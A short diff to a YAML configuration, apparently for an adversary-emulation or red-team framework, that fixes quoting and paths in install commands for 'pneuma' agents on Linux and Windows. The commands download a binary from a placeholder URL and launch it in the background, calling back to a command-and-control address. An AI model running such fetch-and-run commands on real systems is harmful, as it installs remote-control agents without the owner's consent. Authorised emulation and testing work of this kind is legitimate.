@@ -38,7 +38,7 @@ pneuma:
   payloads:
     pneuma-linux:
       install: |
-        curl PAYLOAD.URL > /tmp/pneuma && chmod +x /tmp/pneuma && nohup /tmp/pneuma -name $(echo $HOSTNAME) -address #{callback} -range "Cloud" &
+        curl 'PAYLOAD.URL' > /tmp/pneuma && chmod +x /tmp/pneuma && nohup /tmp/pneuma -name $(echo $HOSTNAME) -address #{callback} -range "Cloud" &
     pneuma-windows.exe:
       install: |
         mkdir "c:\aws\download"
@@ -46,8 +46,7 @@ pneuma:
         $wc = New-Object System.Net.WebClient
         $myurl="PAYLOAD.URL"
         $wc.DownloadFile("$myurl","C:\aws\download\pneuma-windows.exe")
-        Start-Process -FilePath pneuma-windows.exe -ArgumentList "-name
-        $env:COMPUTERNAME -address #{callback} -range Cloud"
+        Start-Process -FilePath C:\aws\download\pneuma-windows.exe -ArgumentList "-name $env:COMPUTERNAME -address #{callback} -range Cloud"
     pneuma-darwin: {}
 
 schism:
